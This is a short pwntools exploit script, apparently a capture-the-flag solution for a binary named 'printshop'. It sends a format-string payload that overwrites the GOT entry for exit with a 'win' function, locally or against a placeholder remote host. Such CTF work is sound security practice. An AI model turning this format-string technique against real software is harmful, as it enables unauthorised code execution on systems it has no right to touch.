#!/usr/bin/env python3

from pwn import *

elf = ELF("./printshop")
context.binary = elf

gdb_cmds = []
r = ["addr",1337]

def conf():
	if args.REMOTE:
		p = remote(r[0],r[1])
	else:
		p = process([elf.path])
		if args.GDB:
			gdb.attach(p,gdbscript='\n'.join(gdb_cmds))
	return p

def main():

	p = conf()

	p.recvrepeat(1)
	p.sendline(fmtstr_payload(6, {elf.got["exit"] : elf.symbols["win"]}))

	p.interactive()


if __name__ == "__main__":
	main()
